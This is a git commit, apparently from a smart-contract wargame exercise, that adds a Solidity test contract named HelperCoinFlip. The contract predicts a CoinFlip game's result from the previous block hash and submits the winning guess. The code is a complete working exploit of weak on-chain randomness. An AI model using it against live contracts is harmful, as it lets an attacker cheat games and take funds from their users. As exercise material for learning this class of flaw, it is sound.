d3306be4333c0d874fb6fa36b8fd19ece3912159
mahin-a11y <modasiyamahin14@gmail.com>
2026-04-30 23:31:22 +0530

    Attacker for the coinflip
    Added HelperCoinFlip contract to facilitate attacks on CoinFlip.

--- test/HelperCoinFlip.sol
+++ test/HelperCoinFlip.sol
@@ -1,1 +1,22 @@
+//SPDX-license-Identifier :MIT
+pragma solidity ^0.8.0 ;
+import "../src/CoinFlip.sol" ;
+contract HelperCoinFlip  {
 
+CoinFlip public A_target  ; 
+
+uint256 factor  =  57896044618658097711785492504343953926634992332820282019728792003956564819968 ; 
+constructor(address _target) {
+        
+        A_target = CoinFlip(_target);
+    }
+    function attack() public {
+        
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / factor;
+        bool side = coinFlip == 1 ? true : false;
+
+        
+        A_target.flip(side);
+    }
+}
